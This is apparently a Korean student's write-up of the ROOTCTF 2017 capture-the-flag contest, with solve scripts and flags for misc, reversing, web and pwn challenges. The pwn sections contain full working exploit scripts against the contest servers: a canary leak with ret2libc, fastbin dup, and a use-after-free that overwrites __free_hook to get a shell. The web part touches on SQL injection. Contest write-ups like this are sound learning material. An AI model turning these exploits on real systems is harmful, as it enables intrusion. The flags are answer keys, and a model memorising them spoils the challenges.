# ROOTCTF2017 Writeup

yeonnic = 강연호(거제제일고등학교)

## Welcome 50pt (misc)
```
제 1회 서울디지텍고등학교 해킹방어대회 
에 오신 것을 환영합니다
모든 문제의 정답은 다음과 같은 형식을 가지고 있습니다 
정답 형식 = FLAG{내용} 

FLAG{Welcome_to_Seoul_Digitech_ROOT_CTF} 
```
flag = FLAG{Welcome_to_Seoul_Digitech_ROOT_CTF} 

## Calculate 167pt (misc)
```
누가 내 패스워드좀 알려줘!
hint : 역연산
```
문제 코드를 역연산해주면 된다.

### solve.py
```python
def one(num, size):
    r = num + size
    r += 915
    return r

def one_r(num,size):
    r = num-size-915
    return r

def two(num, size):
    r = num - size
    r -= 372
    return r

def two_r(num, size):
    r = num+372+size
    return r


def three(num, size):
    r = num ^ size
    r ^= 826
    return r

def three_r(num, size):
    r = num ^ 826
    r ^=size
    return r

def four(num, size):
    size %= 32
    r = num >> (32 - size)
    b = (num << size) - (r << 32)
    return b + r

def four_r(num, size):
    return num/16

if __name__ == "__main__":
    result = [5040, 4944, 5088, 4992, 7232, 4848, 7584, 7344, 4288, 7408, 7360, 7584, 4608, 4880, 4320, 7328, 7360,
              4608, 4896, 4320, 7472, 7328, 7360, 4608, 4752, 4368, 4848, 4608, 4848, 4368, 4944, 7200]
    flag=""
    for i in range(len(result)):
        t=result[i]
        t=four_r(t,100)
        t=three_r(t,100)
        t=two_r(t,100)
        t=one_r(t,100)
        flag+=chr(t)


    print flag
```
flag = FLAG{Rev3rse_P1us_M1nus_X0R_R0L}

## Stage Game 229pt (rev)
```
인내의 시간..
Stage Level 1~10
hint : Sleep
```
IDA로 플래그를 출력해주는 부분을 찾은 다음 플래그로 생각되는 문자열을 뽑아냈다.
```c
int __cdecl sub_468E80(int a1)
{
  int v1; // ST04_4
  signed int i; // [esp+DCh] [ebp-94h]
  int v4; // [esp+E8h] [ebp-88h]
  int v5; // [esp+F4h] [ebp-7Ch]
  void *v6; // [esp+F8h] [ebp-78h]
  int *v7; // [esp+FCh] [ebp-74h]
  char *v8; // [esp+100h] [ebp-70h]
  int v9; // [esp+104h] [ebp-6Ch]
  int v10; // [esp+108h] [ebp-68h]
  int v11; // [esp+10Ch] [ebp-64h]
  int v12; // [esp+110h] [ebp-60h]
  int v13; // [esp+114h] [ebp-5Ch]
  int v14; // [esp+118h] [ebp-58h]
  int v15; // [esp+11Ch] [ebp-54h]
  int v16; // [esp+120h] [ebp-50h]
  int v17; // [esp+124h] [ebp-4Ch]
  int v18; // [esp+128h] [ebp-48h]
  int v19; // [esp+12Ch] [ebp-44h]
  int v20; // [esp+130h] [ebp-40h]
  int v21; // [esp+134h] [ebp-3Ch]
  int v22; // [esp+138h] [ebp-38h]
  int v23; // [esp+13Ch] [ebp-34h]
  int v24; // [esp+140h] [ebp-30h]
  int v25; // [esp+144h] [ebp-2Ch]
  int v26; // [esp+148h] [ebp-28h]
  int v27; // [esp+14Ch] [ebp-24h]
  int v28; // [esp+150h] [ebp-20h]
  int v29; // [esp+154h] [ebp-1Ch]
  int v30; // [esp+158h] [ebp-18h]
  int v31; // [esp+15Ch] [ebp-14h]
  int v32; // [esp+160h] [ebp-10h]
  int v33; // [esp+164h] [ebp-Ch]

  v5 = 4587520;
  v6 = &loc_4C0000;
  v7 = dword_410000;
  v8 = &byte_46FFB4[76];
  v9 = '{\0\0';
  v10 = 'Y\0\0';
  v11 = '0\0\0';
  v12 = 'u\0\0';
  v13 = 'r\0\0';
  v14 = '_\0\0';
  v15 = 'p\0\0';
  v16 = '4\0\0';
  v17 = 't\0\0';
  v18 = '1\0\0';
  v19 = 'e\0\0';
  v20 = 'n\0\0';
  v21 = 'c\0\0';
  v22 = '3\0\0';
  v23 = '_\0\0';
  v24 = '1\0\0';
  v25 = 's\0\0';
  v26 = '_\0\0';
  v27 = 'g\0\0';
  v28 = 'r\0\0';
  v29 = '3\0\0';
  v30 = 'a\0\0';
  v31 = 't\0\0';
  v32 = '!\0\0';
  v33 = '}\0\0';
  v4 = a1 / 10000000 + 6;
  for ( i = 0; i < 29; ++i )
  {
    v1 = __ROL4__(*(&v5 + i), v4);
    sub_45A83B("%c");
  }
  return sub_45A83B("\n");
}
```
flag = FLAG{Y0ur_p4t1enc3_1s_gr3at!}

## EGG 863pt (rev)
```
게임을 하는데 캐릭터가 죽어버렸다
어서 빨리 살려서 다시 게임을 하자
hint : xor
```

이 함수에서 플래그를 뽑아낸다 입력값을 순서대로 sha(i+2)에서 뽑혀나온 키로 xor한뒤 f에있는 문자열과 비교한다.
sha(i+2)에서 나오는 키들을 구한다음 f에다가 xor하면 플래그가 나온다.

```c
int ch(void)
{
  int result; // eax
  __int64 v1; // [rsp+30h] [rbp-20h]
  int i; // [rsp+3Ch] [rbp-14h]

  LOWORD(v1) = 30839;
  BYTE2(v1) = 121;
  BYTE3(v1) = 122;
  for ( i = 0; i < strlen(buf); ++i )
    buf[i] ^= sha(i + 2);
  if ( !strcmp(buf, f) )
    result = printf(
               "\n The egg hatches.",
               f,
               'HGFEDCBA',
               'PONMLKJI',
               'XWVUTSRQ',
               'fedcbaZY',
               'nmlkjihg',
               'vutsrqpo',
               v1);
  else
    result = init2();
  return result;
}
```

### solve.py
```python
enc="Mh;y;mR1@OijQhHW6Ah=hB"
key=[0xc,6,0xa,0xf,0xa,0xc,0xd,2,7,8,7,3,7,1,9,8,5,0xf,1,0xb,5,3]

flag=""

for i in range(len(key)):
    flag += chr(ord(enc[i]) ^ key[i])

print "FLAG{%s}" %(flag)
```
flag = FLAG{An1v1a_3GGniViA_3Ni6mA}

## Login 50pt (web)
```
로그인 페이지인데 로그인이 안된다... 
로그인을 성공하고 짱해커가 되어보자!!
Hint : Array, length<6
Hint2 : Get으로 배열을 전송하는 방법, sql injection
```

문제 소스를보면 쿠키에다가 base64로 인코딩돼있는 문자열을 집어넣는다.
여러번 디코드하면 플래그가 나온다.

```php
<?php 
include("dbcon.php"); 
$pw=$_GET['pw']; 
$fpw=$_GET['pw'][1]; 
if(strlen($fpw)>5){ 
    echo "<script>alert('no hack~');location.href='login.html'</script>"; 
} 
$query="select * from Login where pw='$fpw'"; 
$info=mysqli_query($con,$query); 
$result=mysqli_fetch_array($info); 
if($result['id']){ 
    setcookie("flag","VmxjeE1FNUdSbk5UV0hCclUwVmFiMWxzVm1GTlZtUnhVbFJXYVZKdGVGcFdSM0JYWWxaV1ZVMUVhejA9"); 
    echo "<script>location.href='flag.html'</script>"; 
} 
highlight_file("login.php"); 
?>
```

flag = FLAG{jjang_easy}

## SPACE PROSPECTION 529pt (web)

```
2023년... SPACE PROSPECTION라는 회사가 화성에 진출했다.
회사의 사이트에 들어가 핵심 기술을 가져오자!!
```

http://sdhsroot.kro.kr/BlackOut/.singlepost.html.swp 여기에 들어가면 핵심기술을 찾을수있다.

flag = FLAG{FROM_2017_FLAG}

## 보물찾기 149pt (web)

```
홈페이지 내에 존재하는 플레그를 찾아보세염!
```
갓크롬 개발자모드에서 sources로 찾았다.
http://sdhsroot.kro.kr/vendor/bootstrap/css/bootstrap.min.css

flag = FLAG{bootstrap_1s_jj4ng}

## Phishing 600pt (web)

```
문제에 오류가 있을수도...
Hint1 : 꺠진 문자열이 플레그일수도,,,
```
문제에 들어가면 바로 튕긴다.
wget을 써서 index.php를 받고

```php
<script>
alert("부적절한 접근입니다.");
location.href="404";
//asd.php
</script>
```

asd.php를 받으면 js가 난독화되어있다;;

난독화해제 개꿀 사이트인 http://jsbeautifier.org/ 에서 해제한 다음 코드를 다듬어서 플래그를 띄웠다.

```js
var b = 200;
for (a = 0; a <= 20; a++) {
    b = b + ((a * b) - (a / b));
    if (a == 0) b = 70;
    else if (a == 1) b = 76;
    else if (a == 3) b = 71;
    else if (a == 2) b = 65;
    else if (a == 4) b = 123;
    else if (a == 20) b = 125;
    else if (a == 5) {
        continue
    } else if (a == 6) {
        alert("코");
        continue
    } else if (a == 7) {
        alert("드");
        continue
    } else if (a == 8) {
        alert("속");
        continue
    } else if (a == 9) {
        alert("에");
        continue
    } else if (a == 10) {
        alert(".");
        continue
    } else if (a == 11) {
        alert(".");
        continue
    } else if (a == 12) {
        alert(".");
        continue
    } else if (a >= 4 && a <= 20) {
        continue
    }
    alert(String.fromCharCode(b))
}
```
```js
var asd="";
var b=200;for(a=0;a<=20;a++){b=b+((a*b)-(a/b));if(a==0)b=70;else if(a==1)b=76;else if(a==3)b=71;else if(a==2)b=65;else if(a==4)b=123;else if(a==20)b=125;asd+=String.fromCharCode(b)}
```

flag = FLAG{ˡᐭꅭ곚삍䘐䣇눛뵼ᩎꓨᶐㆰ}

## Point to pointer! 529pt (pwn)

```
넘나 쉬운 문제 당신도 풀 수 있습니다!
nc 222.110.147.52:42632
```

힙에다 함수주소를 넣고 데이터를 입력받는다. 이때 오버플로가 발생하니까
원샷 주소로 덮은다음 쉘을 따면 된다.

```python
from pwn import *
p=remote("222.110.147.52",42632)
print p.recv()
p.sendline("\x00"*0x10+p64(0x4007a7))
print p.recv()
p.sendline("Y")

p.interactive()
```

flag = FLAG{P0InT_2_pOiNt_2_PO1t3R!}

## Factorization 889pt (pwn)

```
열심히 수련하여 샌드백을 터뜨리자!
nc 222.110.147.52 6975
```

특정 숫자를 맞춰주면 BOF를 일으킬수있다.
12의 6승으로 맞추고 puts.got를 릭하고 메인으로 다시 돌아가서
한번더 BOF로 system(/bin/sh)를 해서 쉘을 얻었다.

```python
from yeonnic import *

elf=ELF("./sandbag")

p=remote("222.110.147.52", 6975)

def fuck_bof(data):
    p.sendline("2")
    print p.recv()
    p.sendline("4")
    print p.recv()
    p.sendline(data)

print p.recv()

for i in range(2):
    for j in range(3):
        for x in range(12):
            p.sendline(str(i+1))
            print p.recv()
            p.sendline(str(j+1))
            print p.recv()

gdb_attach(p,"b *0x8048dee\nc")

p.sendline("3")
print p.recv()
p.sendline("4")
print p.recv()

fuck_bof("A"*0x3f+"B")
print p.recvuntil("AB")
canary=u32(p.recv(4))-10
print p.recv()
print 'canary -> ',hex(canary)

fuck_bof("A"*0x40+flat(canary,0,elf.plt['puts'],0x8048d87,elf.got['puts']))
print p.recv()
p.sendline("6")
print p.recvuntil("Good Bye~\n")
puts=u32(p.recv(4))
print p.recv()

libc=get_libc("puts",puts)

for i in range(2):
    for j in range(3):
        for x in range(12):
            p.sendline(str(i+1))
            print p.recv()
            p.sendline(str(j+1))
            print p.recv()
p.sendline("3")
print p.recv()
p.sendline("4")
print p.recv()

fuck_bof("A"*0x40+flat(canary,0,libc.symbols['system'],0,next(libc.search("/bin/sh\x00"))))

p.sendline("6")

p.interactive()
```

flag = FLAG{dO_y0u_kNOw_F@ct0rIzAtion?}

## Allocate 991pt (pwn)

```
There are many allocation methods in this world.
Learn a lot and get shell
222.110.147.52:28417
```

malloc 를 할당하고 해제할때
```c
++dword_20303C;
        free(malloc_list[idx]);
        if ( dword_203044 > 0 )
          malloc_list[idx] = 0LL;
        ++dword_203044;
```
초기화를 한번 안해서 fastbin dup를 사용할 수 있다.
릭은 realloc을 사용해서 unsortedbin을 만들어서 립씨를 읽었고
realloc_hook을 덮은다음 쉘을 땃다.

```python
from yeonnic import *

context.arch="amd64"
elf=ELF("./Allocate")
libc=ELF("./libc.so.6")

#p=process("./Allocate")
p=remote("222.110.147.52",28417)
def allocate_enter():
    time.sleep(0.1)
    p.sendline("1")
    time.sleep(0.2)
    print p.recv()
def allocate_exit():
    time.sleep(0.1)
    p.sendline("6")
    time.sleep(0.2)
    print p.recv()
def calloc(size, data):
    time.sleep(0.1)
    p.sendline("2")
    print p.recv()
    time.sleep(0.1)
    p.sendline(str(size))
    print p.recv()
    time.sleep(0.2)
    p.sendline(data)
    print p.recv()
def malloc(size, data):
    time.sleep(0.1)
    p.sendline("1")
    print p.recv()
    p.sendline(str(size))
    time.sleep(0.2)
    print p.recv()
    time.sleep(0.2)
    p.sendline(data)

def free_enter():
    
    time.sleep(0.1)
    p.sendline("1222")
    time.sleep(0.2)
    print p.recv()
def calloc_free(idx):
    free_enter()
    time.sleep(0.1)
    p.sendline("2")
    print p.recv()
    p.sendline(str(idx))
    time.sleep(0.2)
    print p.recv()
def malloc_free(idx):
    free_enter()
    time.sleep(0.1)
    p.sendline("1")
    print p.recv()
    time.sleep(0.1)
    p.sendline(str(idx))
    time.sleep(0.2)
    print p.recv()

allocate_enter()
malloc(0x68,"AAAA")
malloc(0x68,"AAAA")
malloc(0x68,"AAAA")
calloc(0x80,"BBB")
calloc(0x80,"BBB")
allocate_exit()


allocate_enter()
p.sendline("3")
print p.recv()
p.sendline(str(0x100))
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline("ls;sh")
print p.recv()
calloc(0x80,"A"*6+"B")
allocate_exit()
p.sendline("3")
p.recvuntil("AB\n")
libc_base=u64(p.recv(6)+"\x00\x00")-0x3c4b78
print p.recv()
target=libc_base+0x3c4aed
one_shot=libc_base+0x4526a
system=libc_base+libc.symbols['system']
stderr=libc_base+libc.symbols['_IO_2_1_stderr_']
stdout=libc_base+libc.symbols['_IO_2_1_stdout_']
stdin=libc_base+libc.symbols['_IO_2_1_stdin_']

print "libc base -> ",hex(libc_base)

malloc_free(0)
malloc_free(1)
malloc_free(0)
allocate_enter()
malloc(0x68,p64(target))
malloc(0x68,p64(target))
malloc(0x68,p64(target))
malloc(0x68,"ASD"+flat(system,system,system))

gdb_pie_attach(p,[0x1d68, 0x1c83])
#malloc(0x68,"ASD"+flat(0,0,0,0,0,libc_base+0x3c56e0,stderr,stdout,stdin,one_shot,one_shot))

#calloc(next(libc.search("/bin/sh\x00"))+libc_base,"")

p.interactive()
```

flag = FLAG{S0lo_Att4cks_the_H3ap_during_Chr1s7mas}


## WarOfTheGods 991pt (pwn)
```
Can you win?
nc 222.110.147.52:5265
HINT1: fastbin dup into stack
```

데미갓을 딜리트할때 god name도 같이 해제하는대 이때 uaf가 발생한다.
이걸 이용해서 립씨를 릭하고 fastbin dup를 이용해서 god name포인터를 free_hook주소로 덮어쓰고 쉘을 획득했다.

```python
from yeonnic import *

elf=ELF("./WarOfTheGods")
libc=ELF("./libc.so.6")

#p=process("./WarOfTheGods")
p=remote("222.110.147.52",5265)

print p.recv()
p.sendline("1")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("1")
print p.recv()
for i in range(4):
    p.sendline(p32(0x41))
    print p.recv()
p.sendline(str(0x400))
print p.recv()
p.sendline(p32(0x41)*32)
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("5")
print p.recv()

p.sendline("1")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("8")
print p.recv()
p.sendline(p32(0x41))
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("20")
print p.recv()
p.sendline("15")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("5")
print p.recv()


p.sendline("3")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("4")
print p.recv()
p.sendline("4")
print p.recv()
p.sendline(str(0x10))
print p.recv()
p.sendline(p32(0x41))
print p.recv()
p.sendline(p32(0x41))
print p.recv()

p.sendline("3")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline("5")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("3")
print p.recvuntil("GOD Index: 4\nGOD Name: ")
libc_base=u32(p.recv(4))-0x1b27b0
heap_base=u32(p.recv(4))-0x818
target=heap_base+0x344
free_hook_3=libc_base+0x1b38b0
system=libc_base+libc.symbols['system']
print 'libc_base -> ',hex(libc_base)
print 'heap_base -> ',hex(heap_base)
time.sleep(0.2)
print p.recv()
raw_input()
for i in range(3):
    p.sendline("1")
    print p.recv()
    p.sendline(str(0x3c))
    time.sleep(0.2)
    print p.recv()
    p.sendline(p32(0x41))
    print p.recv()
    p.sendline(p32(0x41))
    print p.recv()

p.sendline("5")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("8")
time.sleep(0.2)
print p.recv()
p.sendline(p32(0x41))
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("20")
print p.recv()
p.sendline("15")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("5")
time.sleep(0.2)
print p.recv()

p.sendline("3")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("5")
print p.recv()
p.sendline("5")
print p.recv()
p.sendline(str(0x10))
print p.recv()
p.sendline(p32(0x41))
print p.recv()
p.sendline(p32(0x41))
print p.recv()

p.sendline("3")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline("5")
print p.recv()

p.sendline("1")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("2")
time.sleep(0.2)
print p.recv()
p.sendline("6")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("5")
print p.recv()


for i in range(3):
    p.sendline("1")
    print p.recv()
    p.sendline(str(0x3c))
    print p.recv()
    p.sendline(p32(target))
    print p.recv()
    p.sendline(p32(0x41))
    print p.recv()
p.sendline("1")
print p.recv()
p.sendline(str(0x3c))
print p.recv()
p.sendline(flat(0,0x39,free_hook_3,free_hook_3,0x100,8,8))
print p.recv()
p.sendline(p32(0x41))
print p.recv()
p.sendline("5")
print p.recv()
p.sendline("1")
print p.recv()
gdb_pie_attach(p,[0x8ae,0x3b91,0xde6,0x18ce], "\ntracemalloc on\nheapinfoall\n")
p.sendline("3")
print p.recv()
p.sendline("4")
print p.recv()
p.sendline("5")
print p.recv()
p.sendline(p32(system)+";sh\x00")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("5")


print 'libc_base -> ',hex(libc_base)
print 'heap_base -> ',hex(heap_base)

p.interactive()
```

flag = FLAG{E@sy_I5_it_3asy?_It_is_ea5y_!!}

## 후기
마지막에 hs_club를 로컬에서는 쉘을 획득했지만 서버에서 IO문제 때문에 고생하다가 대회가 끝나버려서 좀 아쉽다...(포너블 올킬 ㅃ2ㅃ2 ㅠㅠㅠㅠ)
포너블충이라 다른문제들은 못풀줄 알았는데 생각보다 어렵지않고 퀄리티가 좋아서 재밌게 풀었습니다.
